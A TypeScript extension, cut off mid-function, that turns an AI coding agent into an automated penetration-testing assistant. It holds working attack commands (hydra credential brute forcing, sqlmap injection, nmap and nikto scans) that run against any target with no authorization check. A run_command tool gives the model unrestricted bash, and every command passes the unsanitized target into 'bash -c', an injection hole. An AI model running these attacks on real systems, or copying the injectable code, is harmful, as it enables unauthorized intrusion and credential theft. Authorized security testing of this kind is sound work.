import type { ExtensionAPI } from "@mariozechner/pi-coding-agent";
import { Type } from "typebox";
import { spawn } from "child_process";
import { randomUUID } from "crypto";

// System prompt - now focused on ANALYSIS only, not execution
const REDTEAM_SYSTEM_PROMPT = `
## 🔴 RED TEAM ANALYST MODE

You are a security analyst reviewing penetration testing results. Your role is to:
- Analyze tool output and identify vulnerabilities
- Recommend next steps based on findings
- Document findings using the \`record_finding\` tool
- Prioritize issues by severity
- Generate creative attack variants when using \`generate_attack_variants\`

You do NOT execute commands - the extension handles that automatically.
Focus on analysis, interpretation, and recommendations.

## Attack Variant Generation

When asked to generate attack variants, think creatively about:
- OWASP Top 10 vulnerabilities
- Business logic flaws
- Authentication/authorization bypasses
- API-specific vulnerabilities (BOLA, BFLA, mass assignment)
- Technology-specific exploits based on detected stack
- Supply chain and third-party integration risks
- Misconfigurations specific to the cloud provider/CDN detected
`;

// Attack variant categories for AI generation
const ATTACK_CATEGORIES = [
  "authentication_bypass",
  "authorization_flaws",
  "injection_attacks", 
  "business_logic",
  "api_security",
  "file_handling",
  "cryptographic_issues",
  "information_disclosure",
  "ssrf_oob",
  "deserialization",
  "xxe",
  "jwt_attacks",
  "race_conditions",
  "cache_poisoning",
  "subdomain_takeover",
  "cors_misconfig",
  "csp_bypass",
  "prototype_pollution",
  "graphql_attacks",
  "websocket_attacks"
] as const;

interface AttackVariant {
  id: string;
  category: typeof ATTACK_CATEGORIES[number];
  name: string;
  description: string;
  testCases: string[];
  payloads: string[];
  indicators: string[];
  severity: Finding["severity"];
  automated: boolean;
}

interface Finding {
  severity: "critical" | "high" | "medium" | "low" | "info";
  title: string;
  asset: string;
  description: string;
  evidence: string;
  impact: string;
  remediation: string;
  cvss?: string;
}

interface EngagementState {
  target?: string;
  startTime?: number;
  findings: Finding[];
  toolsUsed: string[];
  scanResults: Record<string, string>;
  attackVariants: AttackVariant[];
  techStack: string[];
  interactshUrl?: string;
}

const SEVERITY_EMOJI: Record<Finding["severity"], string> = {
  critical: "🔴",
  high: "🟠",
  medium: "🟡",
  low: "🟢",
  info: "⚪",
};

// Helper to execute a command asynchronously (non-blocking)
function execCommand(cmd: string, timeoutSec: number = 300): Promise<{ output: string; error: boolean }> {
  return new Promise((resolve) => {
    const proc = spawn("bash", ["-c", cmd], {
      stdio: ["pipe", "pipe", "pipe"],
    });
    let output = "";
    let error = false;

    const timeout = setTimeout(() => {
      proc.kill("SIGKILL");
      error = true;
      output += "\n[TIMEOUT]";
    }, timeoutSec * 1000);

    proc.stdout?.on("data", (data) => {
      output += data.toString();
    });

    proc.stderr?.on("data", (data) => {
      output += data.toString();
    });

    proc.on("close", (code) => {
      clearTimeout(timeout);
      error = error || code !== 0;
      resolve({ output: output.trim(), error });
    });

    proc.on("error", (err) => {
      clearTimeout(timeout);
      resolve({ output: output + "\n" + err.message, error: true });
    });
  });
}

// Truncate output for LLM context
function truncateOutput(output: string, maxLines: number = 200): string {
  const lines = output.split("\n");
  if (lines.length <= maxLines) return output;
  return lines.slice(0, maxLines).join("\n") + `\n\n... (truncated ${lines.length - maxLines} lines)`;
}

export default function (pi: ExtensionAPI) {
  let state: EngagementState = {
    findings: [],
    toolsUsed: [],
    scanResults: {},
    attackVariants: [],
    techStack: [],
  };

  // Restore state on session start
  pi.on("session_start", async (_event, ctx) => {
    for (const entry of ctx.sessionManager.getEntries()) {
      if (entry.type === "custom" && entry.customType === "redteam-state") {
        state = entry.data as EngagementState;
      }
    }
    ctx.ui.notify("🔴 RedTeam Extension Loaded - Direct Execution Mode", "info");
  });

  // Inject analyst prompt
  pi.on("before_agent_start", async (event, _ctx) => {
    return {
      systemPrompt: event.systemPrompt + REDTEAM_SYSTEM_PROMPT,
    };
  });

  // ============================================================
  // DIRECT EXECUTION COMMANDS
  // ============================================================

  pi.registerCommand("recon", {
    description: "🔍 Reconnaissance - Direct scan execution with LLM analysis",
    handler: async (args, ctx) => {
      if (!args) {
        ctx.ui.notify("Usage: /recon <target>", "error");
        return;
      }

      const target = args.trim();
      state.target = target;
      state.startTime = Date.now();
      state.toolsUsed.push("nmap", "whatweb");
      pi.appendEntry("redteam-state", state);

      ctx.ui.notify(`🔍 Starting reconnaissance on ${target}...`, "info");

      // Execute scans directly
      const results: string[] = [];

      // 1. Quick port scan
      ctx.ui.notify("Running: nmap quick scan...", "info");
      const nmapQuick = await execCommand(`nmap -sS -T4 --top-ports 1000 ${target} 2>/dev/null`, 120);
      results.push("## Nmap Quick Scan (Top 1000 ports)\n```\n" + truncateOutput(nmapQuick.output) + "\n```");
      state.scanResults["nmap-quick"] = nmapQuick.output;

      // 2. Service version detection on common ports
      ctx.ui.notify("Running: nmap service detection...", "info");
      const nmapSvc = await execCommand(`nmap -sV -sC -p 21,22,23,25,53,80,110,143,443,445,993,995,3306,3389,5432,8080,8443 ${target} 2>/dev/null`, 180);
      results.push("## Nmap Service Detection\n```\n" + truncateOutput(nmapSvc.output) + "\n```");
      state.scanResults["nmap-services"] = nmapSvc.output;

      // 3. Web technology detection (if port 80/443 likely open)
      ctx.ui.notify("Running: whatweb...", "info");
      const whatweb = await execCommand(`whatweb -a 3 http://${target} https://${target} 2>/dev/null`, 60);
      if (whatweb.output.trim()) {
        results.push("## Web Technology Detection\n```\n" + truncateOutput(whatweb.output) + "\n```");
        state.scanResults["whatweb"] = whatweb.output;
      }

      // 4. DNS enumeration
      ctx.ui.notify("Running: DNS enumeration...", "info");
      const dns = await execCommand(`dig ${target} ANY +short 2>/dev/null; dig ${target} MX +short 2>/dev/null; dig ${target} NS +short 2>/dev/null`, 30);
      if (dns.output.trim()) {
        results.push("## DNS Records\n```\n" + truncateOutput(dns.output) + "\n```");
        state.scanResults["dns"] = dns.output;
      }

      pi.appendEntry("redteam-state", state);

      const combinedResults = results.join("\n\n");
      ctx.ui.notify("✅ Reconnaissance complete. Sending to LLM for analysis...", "info");

      // Send ONLY the output to the LLM for analysis
      pi.sendUserMessage(
        `## Reconnaissance Results for ${target}

The following scans were executed automatically. Analyze the results and:
1. Identify all open ports and services
2. Note any version numbers that may have known vulnerabilities
3. Highlight any security misconfigurations
4. Use \`record_finding\` for any issues discovered
5. Recommend specific next steps (which services to probe further)

${combinedResults}`,
        { deliverAs: "followUp" }
      );
    },
  });

  pi.registerCommand("portscan", {
    description: "🔌 Full Port Scan - Comprehensive TCP/UDP scan",
    handler: async (args, ctx) => {
      if (!args) {
        ctx.ui.notify("Usage: /portscan <target>", "error");
        return;
      }

      const target = args.trim();
      state.target = target;
      state.toolsUsed.push("nmap");
      pi.appendEntry("redteam-state", state);

      ctx.ui.notify(`🔌 Starting full port scan on ${target}...`, "info");

      // Full TCP scan
      ctx.ui.notify("Running: nmap full TCP scan (this may take a while)...", "info");
      const tcpScan = await execCommand(`nmap -sS -p- --min-rate=3000 -T4 ${target} 2>/dev/null`, 600);
      state.scanResults["nmap-full-tcp"] = tcpScan.output;

      // Top UDP ports
      ctx.ui.notify("Running: nmap UDP scan (top 100)...", "info");
      const udpScan = await execCommand(`nmap -sU --top-ports 100 --min-rate=1000 ${target} 2>/dev/null`, 300);
      state.scanResults["nmap-udp"] = udpScan.output;

      pi.appendEntry("redteam-state", state);
      ctx.ui.notify("✅ Port scan complete.", "info");

      pi.sendUserMessage(
        `## Full Port Scan Results for ${target}

### TCP Scan (All 65535 ports)
\`\`\`
${truncateOutput(tcpScan.output)}
\`\`\`

### UDP Scan (Top 100 ports)
\`\`\`
${truncateOutput(udpScan.output)}
\`\`\`

Analyze these results:
1. List all open TCP and UDP ports
2. Identify any unusual or high-risk ports
3. Use \`record_finding\` for any security concerns
4. Recommend services to investigate further`,
        { deliverAs: "followUp" }
      );
    },
  });

  pi.registerCommand("vulnscan", {
    description: "🔎 Vulnerability Scan - Automated vuln detection",
    handler: async (args, ctx) => {
      if (!args) {
        ctx.ui.notify("Usage: /vulnscan <target>", "error");
        return;
      }

      const target = args.trim();
      state.toolsUsed.push("nmap-scripts", "nikto", "nuclei");
      pi.appendEntry("redteam-state", state);

      ctx.ui.notify(`🔎 Starting vulnerability scan on ${target}...`, "info");

      const results: string[] = [];

      // Nmap vuln scripts
      ctx.ui.notify("Running: nmap vulnerability scripts...", "info");
      const nmapVuln = await execCommand(`nmap --script=vuln -p 21,22,23,25,53,80,110,143,443,445,993,995,3306,3389,5432,8080,8443 ${target} 2>/dev/null`, 300);
      results.push("## Nmap Vulnerability Scripts\n```\n" + truncateOutput(nmapVuln.output) + "\n```");
      state.scanResults["nmap-vuln"] = nmapVuln.output;

      // Nikto (web vuln scanner)
      ctx.ui.notify("Running: nikto web scanner...", "info");
      const nikto = await execCommand(`nikto -h http://${target} -C all -Tuning x 2>/dev/null | head -100`, 180);
      if (nikto.output.trim() && !nikto.output.includes("No web server")) {
        results.push("## Nikto Web Scanner\n```\n" + truncateOutput(nikto.output) + "\n```");
        state.scanResults["nikto"] = nikto.output;
      }

      // Nuclei (if available)
      ctx.ui.notify("Running: nuclei vulnerability scanner...", "info");
      const nuclei = await execCommand(`nuclei -u http://${target} -severity critical,high,medium -silent 2>/dev/null | head -50`, 300);
      if (nuclei.output.trim()) {
        results.push("## Nuclei Scanner\n```\n" + truncateOutput(nuclei.output) + "\n```");
        state.scanResults["nuclei"] = nuclei.output;
      }

      // SSL/TLS check
      ctx.ui.notify("Running: SSL/TLS analysis...", "info");
      const ssl = await execCommand(`timeout 30 sslscan ${target} 2>/dev/null || timeout 30 openssl s_client -connect ${target}:443 </dev/null 2>/dev/null | openssl x509 -noout -text 2>/dev/null | head -50`, 60);
      if (ssl.output.trim()) {
        results.push("## SSL/TLS Analysis\n```\n" + truncateOutput(ssl.output) + "\n```");
        state.scanResults["ssl"] = ssl.output;
      }

      pi.appendEntry("redteam-state", state);
      ctx.ui.notify("✅ Vulnerability scan complete.", "info");

      pi.sendUserMessage(
        `## Vulnerability Scan Results for ${target}

${results.join("\n\n")}

Analyze these vulnerability scan results:
1. Identify all vulnerabilities found with their severity
2. Look for CVE numbers and known exploits
3. Use \`record_finding\` for EACH vulnerability discovered
4. Prioritize findings by exploitability and impact
5. Recommend exploitation paths if any critical/high vulns found`,
        { deliverAs: "followUp" }
      );
    },
  });

  pi.registerCommand("webscan", {
    description: "🌐 Web Scan - Directory enumeration and web testing",
    handler: async (args, ctx) => {
      if (!args) {
        ctx.ui.notify("Usage: /webscan <target_url>", "error");
        return;
      }

      let target = args.trim();
      if (!target.startsWith("http")) {
        target = `http://${target}`;
      }
      state.toolsUsed.push("gobuster", "curl");
      pi.appendEntry("redteam-state", state);

      ctx.ui.notify(`🌐 Starting web scan on ${target}...`, "info");

      const results: string[] = [];

      // Directory enumeration
      ctx.ui.notify("Running: directory enumeration...", "info");
      const gobuster = await execCommand(
        `gobuster dir -u ${target} -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 30 -q 2>/dev/null || ` +
        `gobuster dir -u ${target} -w /usr/share/wordlists/dirb/common.txt -t 30 -q 2>/dev/null || ` +
        `dirb ${target} /usr/share/dirb/wordlists/common.txt -S 2>/dev/null | head -50`,
        180
      );
      results.push("## Directory Enumeration\n```\n" + truncateOutput(gobuster.output) + "\n```");
      state.scanResults["dirs"] = gobuster.output;

      // Check common sensitive files
      ctx.ui.notify("Running: sensitive file check...", "info");
      const sensitiveFiles = [
        "robots.txt", "sitemap.xml", ".git/HEAD", ".env", ".htaccess",
        "wp-config.php.bak", "config.php.bak", ".DS_Store", "backup.sql",
        "phpinfo.php", "info.php", "test.php", "admin/", "administrator/"
      ];
      const fileChecks: string[] = [];
      for (const file of sensitiveFiles) {
        const check = await execCommand(`curl -s -o /dev/null -w "%{http_code}" "${target}/${file}" 2>/dev/null`, 10);
        if (check.output.trim() === "200") {
          fileChecks.push(`✅ FOUND: ${file}`);
        }
      }
      if (fileChecks.length > 0) {
        results.push("## Sensitive Files Found\n```\n" + fileChecks.join("\n") + "\n```");
      }

      // HTTP headers analysis
      ctx.ui.notify("Running: HTTP headers analysis...", "info");
      const headers = await execCommand(`curl -sI "${target}" 2>/dev/null | head -30`, 30);
      results.push("## HTTP Headers\n```\n" + truncateOutput(headers.output) + "\n```");
      state.scanResults["headers"] = headers.output;

      pi.appendEntry("redteam-state", state);
      ctx.ui.notify("✅ Web scan complete.", "info");

      pi.sendUserMessage(
        `## Web Scan Results for ${target}

${results.join("\n\n")}

Analyze these web scan results:
1. Review discovered directories and files
2. Check for exposed sensitive files (configs, backups, .git)
3. Analyze HTTP headers for security misconfigurations
4. Use \`record_finding\` for any issues discovered
5. Recommend specific web attacks to try (SQLi, XSS, etc.) based on findings`,
        { deliverAs: "followUp" }
      );
    },
  });

  pi.registerCommand("sqli", {
    description: "💉 SQL Injection - Automated SQLi testing",
    handler: async (args, ctx) => {
      if (!args) {
        ctx.ui.notify("Usage: /sqli <url_with_param> (e.g., /sqli http://target.com/?id=1)", "error");
        return;
      }

      const target = args.trim();
      state.toolsUsed.push("sqlmap");
      pi.appendEntry("redteam-state", state);

      ctx.ui.notify(`💉 Starting SQL injection test on ${target}...`, "info");

      // SQLMap scan
      ctx.ui.notify("Running: sqlmap...", "info");
      const sqlmap = await execCommand(
        `sqlmap -u "${target}" --batch --level=3 --risk=2 --threads=4 --output-dir=/tmp/sqlmap-output 2>/dev/null | tail -100`,
        300
      );
      state.scanResults["sqlmap"] = sqlmap.output;

      pi.appendEntry("redteam-state", state);
      ctx.ui.notify("✅ SQLi test complete.", "info");

      pi.sendUserMessage(
        `## SQL Injection Test Results for ${target}

\`\`\`
${truncateOutput(sqlmap.output)}
\`\`\`

Analyze the SQLMap results:
1. Identify if SQL injection was found
2. Note the injection type (UNION, blind, time-based, etc.)
3. Check what database was detected
4. Use \`record_finding\` if SQLi was confirmed (typically CRITICAL severity)
5. Recommend further exploitation steps if vulnerable`,
        { deliverAs: "followUp" }
      );
    },
  });

  pi.registerCommand("bruteforce", {
    description: "🔑 Brute Force - Credential attacks",
    handler: async (args, ctx) => {
      if (!args) {
        ctx.ui.notify("Usage: /bruteforce <target> <service> (services: ssh, ftp, http-post)", "error");
        return;
      }

      const parts = args.trim().split(/\s+/);
      const target = parts[0];
      const service = parts[1] || "ssh";
      state.toolsUsed.push("hydra");
      pi.appendEntry("redteam-state", state);

      ctx.ui.notify(`🔑 Starting brute force on ${target} (${service})...`, "info");

      let hydraCmd = "";
      switch (service.toLowerCase()) {
        case "ssh":
          hydraCmd = `hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt ${target} ssh -t 4 -V 2>/dev/null | tail -50`;
          break;
        case "ftp":
          hydraCmd = `hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt ${target} ftp -t 4 -V 2>/dev/null | tail -50`;
          break;
        case "http-post":
          hydraCmd = `hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt ${target} http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V 2>/dev/null | tail -50`;
          break;
        default:
          hydraCmd = `hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt ${target} ${service} -t 4 -V 2>/dev/null | tail -50`;
      }

      ctx.ui.notify(`Running: hydra ${service}...`, "info");
      const hydra = await execCommand(hydraCmd, 300);
      state.scanResults["hydra"] = hydra.output;

      pi.appendEntry("redteam-state", state);
      ctx.ui.notify("✅ Brute force complete.", "info");

      pi.sendUserMessage(
        `## Brute Force Results for ${target} (${service})

\`\`\`
${truncateOutput(hydra.output)}
\`\`\`

Analyze the brute force results:
1. Check if any valid credentials were found
2. Use \`record_finding\` if weak credentials discovered (HIGH/CRITICAL severity)
3. Note any account lockout or rate limiting observed
4. Recommend post-exploitation steps if credentials found`,
        { deliverAs: "followUp" }
      );
    },
  });

  // ============================================================
  // UTILITY COMMANDS
  // ============================================================

  pi.registerCommand("finding", {
    description: "📝 Record Finding - Manually add a vulnerability",
    handler: async (args, ctx) => {
      if (!args) {
        ctx.ui.notify("Usage: /finding <severity> <title>", "error");
        return;
      }

      const parts = args.split(" ");
      const severity = parts[0].toLowerCase() as Finding["severity"];
      const title = parts.slice(1).join(" ");

      if (!["critical", "high", "medium", "low", "info"].includes(severity)) {
        ctx.ui.notify("Severity must be: critical, high, medium, low, or info", "error");
        return;
      }

      pi.sendUserMessage(
        `I need to document a vulnerability finding:

**Severity**: ${severity.toUpperCase()}
**Title**: ${title}

Please call the \`record_finding\` tool with the following details:
- severity: ${severity}
- title: ${title}
- asset: (the affected system/URL)
- description: (what the vulnerability is)
- evidence: (proof it exists)
- impact: (what could happen if exploited)
- remediation: (how to fix it)`,
        { deliverAs: "followUp" }
      );
    },
  });

  pi.registerCommand("report", {
    description: "📊 Generate VAPT Report",
    handler: async (_args, ctx) => {
      const duration = state.startTime
        ? Math.round((Date.now() - state.startTime) / 60000)
        : 0;

      const findingsSummary = state.findings.length > 0
        ? state.findings.map((f, i) => 
            `${i + 1}. ${SEVERITY_EMOJI[f.severity]} [${f.severity.toUpperCase()}] ${f.title} - ${f.asset}`
          ).join("\n")
        : "No findings recorded yet.";

      pi.sendUserMessage(
        `Generate a VAPT Report file called \`VAPT_REPORT.md\`.

## Engagement Details:
- **Target**: ${state.target || "Not specified"}
- **Duration**: ${duration} minutes
- **Tools Used**: ${state.toolsUsed.join(", ")}

## Recorded Findings (${state.findings.length} total):
${findingsSummary}

## Report Structure:
1. Executive Summary
2. Scope & Methodology
3. Findings (ordered by severity: Critical → High → Medium → Low → Info)
4. Remediation Roadmap
5. Appendices

For each finding, include: description, evidence, impact, and remediation steps.
Write the complete report to \`VAPT_REPORT.md\`.`,
        { deliverAs: "followUp" }
      );
    },
  });

  pi.registerCommand("status", {
    description: "📈 Engagement Status",
    handler: async (_args, ctx) => {
      const duration = state.startTime
        ? Math.round((Date.now() - state.startTime) / 60000)
        : 0;

      const scansRun = Object.keys(state.scanResults).join(", ") || "None";

      ctx.ui.notify(
        `🎯 Target: ${state.target || "Not set"}
⏱️  Duration: ${duration} min
🔧 Tools: ${state.toolsUsed.join(", ") || "None"}
📡 Scans: ${scansRun}
🔴 Findings: ${state.findings.length}`,
        "info"
      );
    },
  });

  pi.registerCommand("results", {
    description: "📋 Show scan results for LLM to re-analyze",
    handler: async (args, ctx) => {
      const scanName = args?.trim();

      if (scanName && state.scanResults[scanName]) {
        pi.sendUserMessage(
          `Re-analyze these scan results for ${scanName}:\n\n\`\`\`\n${truncateOutput(state.scanResults[scanName])}\n\`\`\``,
          { deliverAs: "followUp" }
        );
      } else {
        const available = Object.keys(state.scanResults);
        if (available.length === 0) {
          ctx.ui.notify("No scan results available. Run a scan first.", "error");
        } else {
          ctx.ui.notify(`Available results: ${available.join(", ")}\nUsage: /results <scan_name>`, "info");
        }
      }
    },
  });

  // ============================================================
  // CUSTOM TOOLS FOR LLM
  // ============================================================

  pi.registerTool({
    name: "record_finding",
    label: "Record Vulnerability Finding",
    description: "Record a discovered vulnerability for the VAPT report",
    promptSnippet: "Record a vulnerability finding",
    parameters: Type.Object({
      severity: Type.String({ description: "Severity level: critical, high, medium, low, or info (case-insensitive)" }),
      title: Type.String({ description: "Brief title of the vulnerability" }),
      asset: Type.String({ description: "Affected asset (IP, URL, service)" }),
      description: Type.String({ description: "What the vulnerability is" }),
      evidence: Type.String({ description: "Proof of the vulnerability" }),
      impact: Type.String({ description: "Potential impact if exploited" }),
      remediation: Type.String({ description: "How to fix the vulnerability" }),
      cvss: Type.Optional(Type.String({ description: "CVSS score if known" })),
    }),
    async execute(_toolCallId, params, _signal, _onUpdate, _ctx) {
      // Normalize severity to lowercase for case-insensitive matching
      const normalizedSeverity = params.severity.toLowerCase() as Finding["severity"];
      const validSeverities = ["critical", "high", "medium", "low", "info"];
      if (!validSeverities.includes(normalizedSeverity)) {
        return {
          type: "error" as const,
          error: `Invalid severity "${params.severity}". Must be one of: ${validSeverities.join(", ")}`,
        };
      }
      const finding: Finding = {
        severity: normalizedSeverity,
        title: params.title,
        asset: params.asset,
        description: params.description,
        evidence: params.evidence,
        impact: params.impact,
        remediation: params.remediation,
        cvss: params.cvss,
      };

      state.findings.push(finding);
      pi.appendEntry("redteam-state", state);

      return {
        content: [
          {
            type: "text",
            text: `${SEVERITY_EMOJI[normalizedSeverity]} Finding recorded: [${normalizedSeverity.toUpperCase()}] ${params.title}

Total findings: ${state.findings.length}
- Critical: ${state.findings.filter((f) => f.severity === "critical").length}
- High: ${state.findings.filter((f) => f.severity === "high").length}
- Medium: ${state.findings.filter((f) => f.severity === "medium").length}
- Low: ${state.findings.filter((f) => f.severity === "low").length}
- Info: ${state.findings.filter((f) => f.severity === "info").length}`,
          },
        ],
        details: { finding },
      };
    },
  });

  pi.registerTool({
    name: "list_findings",
    label: "List Findings",
    description: "List all recorded vulnerability findings",
    promptSnippet: "List all findings",
    parameters: Type.Object({}),
    async execute() {
      if (state.findings.length === 0) {
        return {
          content: [{ type: "text", text: "No findings recorded yet." }],
          details: {},
        };
      }

      const sortedFindings = [...state.findings].sort((a, b) => {
        const order = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
        return order[a.severity] - order[b.severity];
      });

      const report = sortedFindings
        .map((f, i) => `${i + 1}. ${SEVERITY_EMOJI[f.severity]} [${f.severity.toUpperCase()}] ${f.title}\n   Asset: ${f.asset}`)
        .join("\n\n");

      return {
        content: [
          {
            type: "text",
            text: `📋 Findings (${state.findings.length} total):\n\n${report}`,
          },
        ],
        details: { findings: sortedFindings },
      };
    },
  });

  pi.registerTool({
    name: "run_command",
    label: "Run Security Command",
    description: "Execute a security testing command directly and return output for analysis",
    promptSnippet: "Run a security command",
    parameters: Type.Object({
      command: Type.String({ description: "The command to execute" }),
      timeout: Type.Optional(Type.Number({ description: "Timeout in seconds (default: 120)" })),
    }),
    async execute(_toolCallId, params, _signal, _onUpdate, _ctx) {
      const result = await execCommand(params.command, params.timeout || 120);
      
      // Track the command
      state.toolsUsed.push(params.command.split(" ")[0]);
      pi.appendEntry("redteam-state", state);

      return {
        content: [
          {
            type: "text",
            text: `Command: \`${params.command}\`\n\nOutput:\n\`\`\`\n${truncateOutput(result.output)}\n\`\`\``,
          },
        ],
        details: { command: params.command, error: result.error },
      };
    },
  });

  pi.registerTool({
    name: "engagement_info",
    label: "Engagement Info",
    description: "Get current engagement status",
    promptSnippet: "Get engagement info",
    parameters: Type.Object({}),
    async execute() {
      const duration = state.startTime
        ? Math.round((Date.now() - state.startTime) / 60000)
        : 0;

      return {
        content: [
          {
            type: "text",
            text: `🎯 Engagement Status:
- Target: ${state.target || "Not set"}
- Duration: ${duration} minutes
- Tools Used: ${state.toolsUsed.join(", ") || "None"}
- Scans Completed: ${Object.keys(state.scanResults).join(", ") || "None"}
- Findings: ${state.findings.length}
- Attack Variants Generated: ${state.attackVariants.length}
- Tech Stack: ${state.techStack.join(", ") || "Unknown"}`,
          },
        ],
        details: { state },
      };
    },
  });

  // ============================================================
  // AI-POWERED ATTACK VARIANT GENERATION
  // ============================================================

  pi.registerTool({
    name: "generate_attack_variants",
    label: "Generate Attack Variants",
    description: "Generate creative security test cases and attack variants based on target reconnaissance. Use this to brainstorm potential vulnerabilities based on detected technologies, endpoints, and configurations.",
    promptSnippet: "Generate attack variants for the target",
    parameters: Type.Object({
      target: Type.String({ description: "Target domain or application" }),
      techStack: Type.Optional(Type.Array(Type.String(), { description: "Detected technologies (e.g., React, Node.js, PostgreSQL, AWS, Cloudflare)" })),
      endpoints: Type.Optional(Type.Array(Type.String(), { description: "Discovered API endpoints" })),
      services: Type.Optional(Type.Array(Type.String(), { description: "Detected third-party services" })),
      focus: Type.Optional(Type.Array(Type.String(), { description: "Specific attack categories to focus on" })),
    }),
    async execute(_toolCallId, params, _signal, _onUpdate, _ctx) {
      // Store tech stack for later reference
      if (params.techStack) {
        state.techStack = params.techStack;
      }

      // This tool returns a prompt for the LLM to generate variants
      const context = `
## Target Analysis for Attack Variant Generation

**Target:** ${params.target}
**Tech Stack:** ${params.techStack?.join(", ") || "Unknown - run reconnaissance first"}
**Discovered Endpoints:** ${params.endpoints?.join(", ") || "None discovered yet"}
**Third-Party Services:** ${params.services?.join(", ") || "None detected"}
**Focus Areas:** ${params.focus?.join(", ") || "All categories"}

## Generate Attack Variants

Based on the above context, generate comprehensive security test cases. For each variant:

1. **Category**: One of: ${ATTACK_CATEGORIES.join(", ")}
2. **Name**: Descriptive attack name
3. **Description**: What the vulnerability is and why it might exist given the tech stack
4. **Test Cases**: Specific tests to perform (3-5 per variant)
5. **Payloads**: Example payloads or techniques to use
6. **Indicators**: What to look for to confirm the vulnerability
7. **Severity**: Expected severity if confirmed (critical/high/medium/low)
8. **Automated**: Whether this can be tested automatically (true/false)

### Technology-Specific Considerations:
${params.techStack?.includes("React") || params.techStack?.includes("Vue") || params.techStack?.includes("Angular") ? "- Frontend SPA: Check for DOM XSS, prototype pollution, source map exposure" : ""}
${params.techStack?.includes("Node.js") || params.techStack?.includes("Express") ? "- Node.js: Check for prototype pollution, SSRF, insecure dependencies" : ""}
${params.techStack?.includes("GraphQL") ? "- GraphQL: Check for introspection, batching attacks, field suggestions, nested query DoS" : ""}
${params.techStack?.includes("JWT") || params.techStack?.includes("Auth0") ? "- JWT: Check for algorithm confusion, key leakage, none algorithm, expired token acceptance" : ""}
${params.techStack?.includes("AWS") ? "- AWS: Check for S3 misconfigs, SSRF to metadata, IAM issues, exposed credentials" : ""}
${params.techStack?.includes("Cloudflare") ? "- Cloudflare: Check for origin bypass, cache poisoning, WAF bypass techniques" : ""}
${params.techStack?.includes("PostgreSQL") || params.techStack?.includes("MySQL") ? "- SQL Database: Check for SQLi, error-based information disclosure" : ""}
${params.techStack?.includes("MongoDB") ? "- MongoDB: Check for NoSQL injection, BSON injection" : ""}
${params.techStack?.includes("Redis") ? "- Redis: Check for SSRF to Redis, cache poisoning" : ""}
${params.techStack?.includes("Stripe") ? "- Stripe: Check for payment bypass, webhook security, idempotency issues" : ""}

### API-Specific Tests (if endpoints discovered):
${params.endpoints?.length ? `
For these endpoints: ${params.endpoints.join(", ")}
- Test BOLA (Broken Object Level Authorization) on resource endpoints
- Test BFLA (Broken Function Level Authorization) on admin endpoints  
- Test mass assignment on POST/PUT endpoints
- Test rate limiting on authentication endpoints
- Test parameter pollution
- Test HTTP method override (X-HTTP-Method-Override)
` : ""}

Generate at least 10 attack variants, prioritizing those most likely to succeed given the detected stack.
After generating, call \`save_attack_variants\` with the generated variants.
`;

      state.target = params.target;
      pi.appendEntry("redteam-state", state);

      return {
        content: [{ type: "text", text: context }],
        details: { target: params.target, techStack: params.techStack },
      };
    },
  });

  pi.registerTool({
    name: "save_attack_variants",
    label: "Save Attack Variants",
    description: "Save generated attack variants to the engagement state for later testing",
    promptSnippet: "Save attack variants",
    parameters: Type.Object({
      variants: Type.Array(Type.Object({
        category: Type.String({ description: "Attack category" }),
        name: Type.String({ description: "Attack name" }),
        description: Type.String({ description: "Attack description" }),
        testCases: Type.Array(Type.String(), { description: "Test cases to perform" }),
        payloads: Type.Array(Type.String(), { description: "Example payloads" }),
        indicators: Type.Array(Type.String(), { description: "Success indicators" }),
        severity: Type.String({ description: "Expected severity" }),
        automated: Type.Boolean({ description: "Can be automated" }),
      })),
    }),
    async execute(_toolCallId, params, _signal, _onUpdate, _ctx) {
      const savedVariants: AttackVariant[] = params.variants.map((v: any) => ({
        id: randomUUID(),
        category: v.category as typeof ATTACK_CATEGORIES[number],
        name: v.name,
        description: v.description,
        testCases: v.testCases,
        payloads: v.payloads,
        indicators: v.indicators,
        severity: v.severity.toLowerCase() as Finding["severity"],
        automated: v.automated,
      }));

      state.attackVariants = [...state.attackVariants, ...savedVariants];
      pi.appendEntry("redteam-state", state);

      const summary = savedVariants
        .map((v, i) => `${i + 1}. [${v.severity.toUpperCase()}] ${v.name} (${v.category}) - ${v.testCases.length} test cases`)
        .join("\n");

      return {
        content: [
          {
            type: "text",
            text: `✅ Saved ${savedVariants.length} attack variants:\n\n${summary}\n\nTotal variants in engagement: ${state.attackVariants.length}\n\nUse /test-variants to run automated tests or /list-variants to review.`,
          },
        ],
        details: { savedVariants },
      };
    },
  });

  pi.registerTool({
    name: "list_attack_variants",
    label: "List Attack Variants",
    description: "List all generated attack variants for the current engagement",
    promptSnippet: "List attack variants",
    parameters: Type.Object({
      category: Type.Optional(Type.String({ description: "Filter by category" })),
      automatedOnly: Type.Optional(Type.Boolean({ description: "Only show automated variants" })),
    }),
    async execute(_toolCallId, params, _signal, _onUpdate, _ctx) {
      let variants = state.attackVariants;

      if (params.category) {
        variants = variants.filter(v => v.category === params.category);
      }
      if (params.automatedOnly) {
        variants = variants.filter(v => v.automated);
      }

      if (variants.length === 0) {
        return {
          content: [{ type: "text", text: "No attack variants found. Use generate_attack_variants first." }],
          details: {},
        };
      }

      const report = variants.map((v, i) => `
### ${i + 1}. ${v.name}
**Category:** ${v.category} | **Severity:** ${SEVERITY_EMOJI[v.severity]} ${v.severity.toUpperCase()} | **Automated:** ${v.automated ? "✅" : "❌"}

${v.description}

**Test Cases:**
${v.testCases.map(t => `- ${t}`).join("\n")}

**Payloads:**
\`\`\`
${v.payloads.join("\n")}
\`\`\`

**Success Indicators:**
${v.indicators.map(i => `- ${i}`).join("\n")}
`).join("\n---\n");

      return {
        content: [{ type: "text", text: `# Attack Variants (${variants.length} total)\n${report}` }],
        details: { variants },
      };
    },
  });

  pi.registerCommand("subdomain", {
    description: "🔍 Subdomain enumeration - find all subdomains for a domain",
    handler: async (args, ctx) => {
      if (!args) {
